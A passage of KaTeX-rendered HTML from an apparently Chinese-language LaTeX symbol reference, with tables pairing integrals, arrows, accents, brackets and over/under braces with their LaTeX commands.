style="margin-right:0.19445em;position:relative;top:-0.0005599999999999772em;">∫</span></span></span></span></td><td><code>\int \int</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∭</mo></mrow><annotation encoding="application/x-tex">\iiint</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.111em;vertical-align:-0.306em;"></span><span class="mop op-symbol small-op" style="margin-right:0.19445em;position:relative;top:-0.0004999999999999727em;">∭</span></span></span></span></td><td><code>\iiint</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∫</mo><mo>∫</mo><mo>∫</mo></mrow><annotation encoding="application/x-tex">\int \int \int</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.11112em;vertical-align:-0.30612em;"></span><span class="mop op-symbol small-op" style="margin-right:0.19445em;position:relative;top:-0.0005599999999999772em;">∫</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-symbol small-op" style="margin-right:0.19445em;position:relative;top:-0.0005599999999999772em;">∫</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-symbol small-op" style="margin-right:0.19445em;position:relative;top:-0.0005599999999999772em;">∫</span></span></span></span></td><td><code>\int \int \int</code></td></tr><tr><td>\iiiint</td><td><code>\iiiint</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∫</mo><mo>∫</mo><mo>∫</mo><mo>∫</mo></mrow><annotation encoding="application/x-tex">\int \int \int \int</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.11112em;vertical-align:-0.30612em;"></span><span class="mop op-symbol small-op" style="margin-right:0.19445em;position:relative;top:-0.0005599999999999772em;">∫</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-symbol small-op" style="margin-right:0.19445em;position:relative;top:-0.0005599999999999772em;">∫</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-symbol small-op" style="margin-right:0.19445em;position:relative;top:-0.0005599999999999772em;">∫</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-symbol small-op" style="margin-right:0.19445em;position:relative;top:-0.0005599999999999772em;">∫</span></span></span></span></td><td><code>\int \int \int \int</code></td></tr><tr><td>\idotsint</td><td><code>\idotsint</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∫</mo><mtext> ⁣</mtext><mo>⋯</mo><mo>∫</mo></mrow><annotation encoding="application/x-tex">\int \dots \int</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.11112em;vertical-align:-0.30612em;"></span><span class="mop op-symbol small-op" style="margin-right:0.19445em;position:relative;top:-0.0005599999999999772em;">∫</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:-0.16666666666666666em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-symbol small-op" style="margin-right:0.19445em;position:relative;top:-0.0005599999999999772em;">∫</span></span></span></span></td><td><code>\int \dots \int</code></td></tr></tbody></table><h3 id="箭头"><a class="markdownIt-Anchor" href="#箭头"></a> 箭头</h3><table><thead><tr><th>符号</th><th>LaTex形式</th></tr></thead><tbody><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>←</mo></mrow><annotation encoding="application/x-tex">\leftarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">←</span></span></span></span></td><td><code>\leftarrow</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">→</span></span></span></span></td><td><code>\rightarrow</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>↔</mo></mrow><annotation encoding="application/x-tex">\leftrightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">↔</span></span></span></span></td><td><code>\leftrightarrow</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>⟵</mo></mrow><annotation encoding="application/x-tex">\longleftarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.522em;vertical-align:-0.011em;"></span><span class="mrel">⟵</span></span></span></span></td><td><code>\longleftarrow</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>⟷</mo></mrow><annotation encoding="application/x-tex">\longleftrightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.522em;vertical-align:-0.011em;"></span><span class="mrel">⟷</span></span></span></span></td><td><code>\longleftrightarrow</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>⟹</mo></mrow><annotation encoding="application/x-tex">\Longrightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.549em;vertical-align:-0.024em;"></span><span class="mrel">⟹</span></span></span></span></td><td><code>\Longrightarrow</code></td></tr></tbody></table><ul><li><code>\xleftarrow</code>和<code>\xrightarrow</code>可根据内容自动调整</li></ul><h3 id="注音和标注"><a class="markdownIt-Anchor" href="#注音和标注"></a> 注音和标注</h3><table><thead><tr><th>符号</th><th>LaTex形式</th></tr></thead><tbody><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>x</mi><mo>ˉ</mo></mover></mrow><annotation encoding="application/x-tex">\bar{x}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.56778em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.56778em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.22222em;">ˉ</span></span></span></span></span></span></span></span></span></td><td><code>\bar&#123;x&#125;</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>x</mi><mo>ˊ</mo></mover></mrow><annotation encoding="application/x-tex">\acute{x}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.22222em;">ˊ</span></span></span></span></span></span></span></span></span></td><td><code>\acute&#123;x&#125;</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>x</mi><mo>˚</mo></mover></mrow><annotation encoding="application/x-tex">\mathring{x}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.34722em;">˚</span></span></span></span></span></span></span></span></span></td><td><code>\mathring&#123;x&#125;</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>x</mi><mo>⃗</mo></mover></mrow><annotation encoding="application/x-tex">\vec{x}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.714em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.714em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.20772em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 53.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 1110.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359c-16-25.333-24-45-24-59z'/></svg></span></span></span></span></span></span></span></span></span></span></td><td><code>\vec&#123;x&#125;</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>x</mi><mo>ˋ</mo></mover></mrow><annotation encoding="application/x-tex">\grave{x}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.22222em;">ˋ</span></span></span></span></span></span></span></span></span></td><td><code>\grave&#123;x&#125;</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>x</mi><mo>˙</mo></mover></mrow><annotation encoding="application/x-tex">\dot{x}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66786em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.66786em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.11111000000000001em;">˙</span></span></span></span></span></span></span></span></span></td><td><code>\dot&#123;x&#125;</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>x</mi><mo>^</mo></mover></mrow><annotation encoding="application/x-tex">\hat{x}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.22222em;">^</span></span></span></span></span></span></span></span></span></td><td><code>\hat&#123;x&#125;</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>x</mi><mo>~</mo></mover></mrow><annotation encoding="application/x-tex">\tilde{x}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6678599999999999em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6678599999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span></span></span><span style="top:-3.35em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.22222em;">~</span></span></span></span></span></span></span></span></span></td><td><code>\tilde&#123;x&#125;</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>x</mi><mo>¨</mo></mover></mrow><annotation encoding="application/x-tex">\ddot{x}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66786em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.66786em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.22222em;">¨</span></span></span></span></span></span></span></span></span></td><td><code>\ddot&#123;x&#125;</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>x</mi><mo>ˇ</mo></mover></mrow><annotation encoding="application/x-tex">\check{x}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.62847em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.62847em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.22222em;">ˇ</span></span></span></span></span></span></span></span></span></td><td><code>\check&#123;x&#125;</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>x</mi><mo>˘</mo></mover></mrow><annotation encoding="application/x-tex">\breve{x}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.22222em;">˘</span></span></span></span></span></span></span></span></span></td><td><code>\breve&#123;x&#125;</code></td></tr><tr><td>\dddot{x}</td><td><code>\dddot&#123;x&#125;</code></td></tr></tbody></table><h3 id="括号"><a class="markdownIt-Anchor" href="#括号"></a> 括号</h3><ul><li>用<code>() [] &#123;&#125; \lange \rangle</code>表示 <code>() [] &#123;&#125; ⟨⟩</code></li></ul><h3 id="分隔符"><a class="markdownIt-Anchor" href="#分隔符"></a> 分隔符</h3><table><thead><tr><th>符号</th><th>LaTex形式</th></tr></thead><tbody><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mrow><mi>x</mi><mi>x</mi><mi>x</mi></mrow><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">\overline{xxx}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.63056em;vertical-align:0em;"></span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.63056em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="mord mathdefault">x</span><span class="mord mathdefault">x</span></span></span><span style="top:-3.55056em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span></span></span></span></td><td><code>\overline&#123;xxx&#125;</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mrow><mi>x</mi><mi>x</mi><mi>x</mi></mrow><mo stretchy="true">↔</mo></mover></mrow><annotation encoding="application/x-tex">\overleftrightarrow{xxx}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9525600000000001em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9525600000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="mord mathdefault">x</span><span class="mord mathdefault">x</span></span></span><span class="svg-align" style="top:-3.43056em;"><span class="pstrut" style="height:3em;"></span><span class="stretchy" style="height:0.522em;min-width:0.888em;"><span class="halfarrow-left" style="height:0.522em;"><svg width='400em' height='0.522em' viewBox='0 0 400000 522' preserveAspectRatio='xMinYMin slice'><path d='M400000 241H110l3-3c68.7-52.7 113.7-120 135-202 4-14.7 6-23 6-25 0-7.3-7-11-21-11-8 0-13.2.8-15.5 2.5-2.3 1.7-4.2 5.8-5.5 12.5-1.3 4.7-2.7 10.3-4 17-12 48.7-34.8 92-68.5 130S65.3 228.3 18 247c-10 4-16 7.7-18 11 0 8.7 6 14.3 18 17 47.3 18.7 87.8 47 121.5 85S196 441.3 208 490c.7 2 1.3 5 2 9s1.2 6.7 1.5 8c.3 1.3 1 3.3 2 6s2.2 4.5 3.5 5.5c1.3 1 3.3 1.8 6 2.5s6 1 10 1c14 0 21-3.7 21-11 0-2-2-10.3-6-25-20-79.3-65-146.7-135-202 l-3-3h399890zM100 241v40h399900v-40z'/></svg></span><span class="halfarrow-right" style="height:0.522em;"><svg width='400em' height='0.522em' viewBox='0 0 400000 522' preserveAspectRatio='xMaxYMin slice'><path d='M0 241v40h399891c-47.3 35.3-84 78-110 128-16.7 32-27.7 63.7-33 95 0 1.3-.2 2.7-.5 4-.3 1.3-.5 2.3-.5 3 0 7.3 6.7 11 20 11 8 0 13.2-.8 15.5-2.5 2.3-1.7 4.2-5.5 5.5-11.5 2-13.3 5.7-27 11-41 14.7-44.7 39-84.5 73-119.5s73.7-60.2 119-75.5c6-2 9-5.7 9-11s-3-9-9-11c-45.3-15.3-85-40.5-119-75.5s-58.3-74.8-73-119.5c-4.7-14-8.3-27.3-11-40-1.3-6.7-3.2-10.8-5.5-12.5-2.3-1.7-7.5-2.5-15.5-2.5-14 0-21 3.7-21 11 0 2 2 10.3 6 25 20.7 83.3 67 151.7 139 205zm0 0v40h399900v-40z'/></svg></span></span></span></span></span></span></span></span></span></span></td><td><code>\overleftrightarrow&#123;xxx&#125;</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><munder accentunder="true"><mrow><mi>x</mi><mi>x</mi><mi>x</mi></mrow><mo stretchy="true">‾</mo></munder></mrow><annotation encoding="application/x-tex">\underline{xxx}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.63056em;vertical-align:-0.19999999999999996em;"></span><span class="mord underline"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.43056000000000005em;"><span style="top:-2.84em;"><span class="pstrut" style="height:3em;"></span><span class="underline-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="mord mathdefault">x</span><span class="mord mathdefault">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19999999999999996em;"><span></span></span></span></span></span></span></span></span></td><td><code>\underline&#123;xxx&#125;</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><munder accentunder="true"><mrow><mi>x</mi><mi>x</mi><mi>x</mi></mrow><mo stretchy="true">↔</mo></munder></mrow><annotation encoding="application/x-tex">\underleftrightarrow{xxx}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9525600000000001em;vertical-align:-0.522em;"></span><span class="mord accentunder"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.43056em;"><span class="svg-align" style="top:-2.4779999999999998em;"><span class="pstrut" style="height:3em;"></span><span class="stretchy" style="height:0.522em;min-width:0.888em;"><span class="halfarrow-left" style="height:0.522em;"><svg width='400em' height='0.522em' viewBox='0 0 400000 522' preserveAspectRatio='xMinYMin slice'><path d='M400000 241H110l3-3c68.7-52.7 113.7-120 135-202 4-14.7 6-23 6-25 0-7.3-7-11-21-11-8 0-13.2.8-15.5 2.5-2.3 1.7-4.2 5.8-5.5 12.5-1.3 4.7-2.7 10.3-4 17-12 48.7-34.8 92-68.5 130S65.3 228.3 18 247c-10 4-16 7.7-18 11 0 8.7 6 14.3 18 17 47.3 18.7 87.8 47 121.5 85S196 441.3 208 490c.7 2 1.3 5 2 9s1.2 6.7 1.5 8c.3 1.3 1 3.3 2 6s2.2 4.5 3.5 5.5c1.3 1 3.3 1.8 6 2.5s6 1 10 1c14 0 21-3.7 21-11 0-2-2-10.3-6-25-20-79.3-65-146.7-135-202 l-3-3h399890zM100 241v40h399900v-40z'/></svg></span><span class="halfarrow-right" style="height:0.522em;"><svg width='400em' height='0.522em' viewBox='0 0 400000 522' preserveAspectRatio='xMaxYMin slice'><path d='M0 241v40h399891c-47.3 35.3-84 78-110 128-16.7 32-27.7 63.7-33 95 0 1.3-.2 2.7-.5 4-.3 1.3-.5 2.3-.5 3 0 7.3 6.7 11 20 11 8 0 13.2-.8 15.5-2.5 2.3-1.7 4.2-5.5 5.5-11.5 2-13.3 5.7-27 11-41 14.7-44.7 39-84.5 73-119.5s73.7-60.2 119-75.5c6-2 9-5.7 9-11s-3-9-9-11c-45.3-15.3-85-40.5-119-75.5s-58.3-74.8-73-119.5c-4.7-14-8.3-27.3-11-40-1.3-6.7-3.2-10.8-5.5-12.5-2.3-1.7-7.5-2.5-15.5-2.5-14 0-21 3.7-21 11 0 2 2 10.3 6 25 20.7 83.3 67 151.7 139 205zm0 0v40h399900v-40z'/></svg></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="mord mathdefault">x</span><span class="mord mathdefault">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.522em;"><span></span></span></span></span></span></span></span></span></td><td><code>\underleftrightarrow&#123;xxx&#125;</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mrow><mi>x</mi><mi>x</mi><mi>x</mi></mrow><mo stretchy="true">←</mo></mover></mrow><annotation encoding="application/x-tex">\overleftarrow{xxx}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9525600000000001em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9525600000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="mord mathdefault">x</span><span class="mord mathdefault">x</span></span></span><span class="svg-align" style="top:-3.43056em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="height:0.522em;min-width:0.888em;"><svg width='400em' height='0.522em' viewBox='0 0 400000 522' preserveAspectRatio='xMinYMin slice'><path d='M400000 241H110l3-3c68.7-52.7 113.7-120 135-202 4-14.7 6-23 6-25 0-7.3-7-11-21-11-8 0-13.2.8-15.5 2.5-2.3 1.7-4.2 5.8-5.5 12.5-1.3 4.7-2.7 10.3-4 17-12 48.7-34.8 92-68.5 130S65.3 228.3 18 247c-10 4-16 7.7-18 11 0 8.7 6 14.3 18 17 47.3 18.7 87.8 47 121.5 85S196 441.3 208 490c.7 2 1.3 5 2 9s1.2 6.7 1.5 8c.3 1.3 1 3.3 2 6s2.2 4.5 3.5 5.5c1.3 1 3.3 1.8 6 2.5s6 1 10 1c14 0 21-3.7 21-11 0-2-2-10.3-6-25-20-79.3-65-146.7-135-202 l-3-3h399890zM100 241v40h399900v-40z'/></svg></span></span></span></span></span></span></span></span></span></td><td><code>\overleftarrow&#123;xxx&#125;</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover><mrow><mi>x</mi><mi>x</mi><mi>x</mi></mrow><mo stretchy="true">⏞</mo></mover></mrow><annotation encoding="application/x-tex">\overbrace{xxx}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.07856em;vertical-align:0em;"></span><span class="mord mover"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.07856em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="mord mathdefault">x</span><span class="mord mathdefault">x</span></span></span><span class="svg-align" style="top:-3.53056em;"><span class="pstrut" style="height:3em;"></span><span class="stretchy" style="height:0.548em;min-width:1.6em;"><span class="brace-left" style="height:0.548em;"><svg width='400em' height='0.548em' viewBox='0 0 400000 548' preserveAspectRatio='xMinYMin slice'><path d='M6 548l-6-6v-35l6-11c56-104 135.3-181.3 238-232 57.3-28.7 117-45 179-50h399577v120H403c-43.3 7-81 15-113 26-100.7 33-179.7 91-237 174-2.7 5-6 9-10 13-.7 1-7.3 1-20 1H6z'/></svg></span><span class="brace-center" style="height:0.548em;"><svg width='400em' height='0.548em' viewBox='0 0 400000 548' preserveAspectRatio='xMidYMin slice'><path d='M200428 334c-100.7-8.3-195.3-44-280-108-55.3-42-101.7-93-139-153l-9-14c-2.7 4-5.7 8.7-9 14-53.3 86.7-123.7 153-211 199-66.7 36-137.3 56.3-212 62H0V214h199568c178.3-11.7 311.7-78.3 403-201 6-8 9.7-12 11-12 .7-.7 6.7-1 18-1s17.3.3 18 1c1.3 0 5 4 11 12 44.7 59.3 101.3 106.3 170 141s145.3 54.3 229 60h199572v120z'/></svg></span><span class="brace-right" style="height:0.548em;"><svg width='400em' height='0.548em' viewBox='0 0 400000 548' preserveAspectRatio='xMaxYMin slice'><path d='M400000 542l-6 6h-17c-12.7 0-19.3-.3-20-1-4-4-7.3-8.3-10-13-35.3-51.3-80.8-93.8-136.5-127.5s-117.2-55.8-184.5-66.5c-.7 0-2-.3-4-1-18.7-2.7-76-4.3-172-5H0V214h399571l6 1c124.7 8 235 61.7 331 161 31.3 33.3 59.7 72.7 85 118l7 13v35z'/></svg></span></span></span></span></span></span></span></span></span></span></td><td><code>\overbrace&#123;xxx&#125;</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><munder accentunder="true"><mrow><mi>x</mi><mi>x</mi><mi>x</mi></mrow><mo stretchy="true">←</mo></munder></mrow><annotation encoding="application/x-tex">\underleftarrow{xxx}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9525600000000001em;vertical-align:-0.522em;"></span><span class="mord accentunder"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.43056em;"><span class="svg-align" style="top:-2.4779999999999998em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="height:0.522em;min-width:0.888em;"><svg width='400em' height='0.522em' viewBox='0 0 400000 522' preserveAspectRatio='xMinYMin slice'><path d='M400000 241H110l3-3c68.7-52.7 113.7-120 135-202 4-14.7 6-23 6-25 0-7.3-7-11-21-11-8 0-13.2.8-15.5 2.5-2.3 1.7-4.2 5.8-5.5 12.5-1.3 4.7-2.7 10.3-4 17-12 48.7-34.8 92-68.5 130S65.3 228.3 18 247c-10 4-16 7.7-18 11 0 8.7 6 14.3 18 17 47.3 18.7 87.8 47 121.5 85S196 441.3 208 490c.7 2 1.3 5 2 9s1.2 6.7 1.5 8c.3 1.3 1 3.3 2 6s2.2 4.5 3.5 5.5c1.3 1 3.3 1.8 6 2.5s6 1 10 1c14 0 21-3.7 21-11 0-2-2-10.3-6-25-20-79.3-65-146.7-135-202 l-3-3h399890zM100 241v40h399900v-40z'/></svg></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="mord mathdefault">x</span><span class="mord mathdefault">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.522em;"><span></span></span></span></span></span></span></span></span></td><td><code>\underleftarrow&#123;xxx&#125;</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><munder><mrow><mi>x</mi><mi>x</mi><mi>x</mi></mrow><mo stretchy="true">⏟</mo></munder></mrow><annotation encoding="application/x-tex">\underbrace{xxx}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.07856em;vertical-align:-0.648em;"></span><span class="mord munder"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.43056000000000005em;"><span class="svg-align" style="top:-2.352em;"><span class="pstrut" style="height:3em;"></span><span class="stretchy" style="height:0.548em;min-width:1.6em;"><span class="brace-left" style="height:0.548em;"><svg width='400em' height='0.548em' viewBox='0 0 400000 548' preserveAspectRatio='xMinYMin slice'><path d='M0 6l6-6h17c12.688 0 19.313.3 20 1 4 4 7.313 8.3 10 13 35.313 51.3 80.813 93.8 136.5 127.5 55.688 33.7 117.188 55.8 184.5 66.5.688 0 2 .3 4 1 18.688 2.7 76 4.3 172 5h399450v120H429l-6-1c-124.688-8-235-61.7-331-161C60.687 138.7 32.312 99.3 7 54L0 41V6z'/></svg></span><span class="brace-center" style="height:0.548em;"><svg width='400em' height='0.548em' viewBox='0 0 400000 548' preserveAspectRatio='xMidYMin slice'><path d='M199572 214c100.7 8.3 195.3 44 280 108 55.3 42 101.7 93 139 153l9 14c2.7-4 5.7-8.7 9-14 53.3-86.7 123.7-153 211-199 66.7-36 137.3-56.3 212-62h199568v120H200432c-178.3 11.7-311.7 78.3-403 201-6 8-9.7 12-11 12-.7.7-6.7 1-18 1s-17.3-.3-18-1c-1.3 0-5-4-11-12-44.7-59.3-101.3-106.3-170-141s-145.3-54.3-229-60H0V214z'/></svg></span><span class="brace-right" style="height:0.548em;"><svg width='400em' height='0.548em' viewBox='0 0 400000 548' 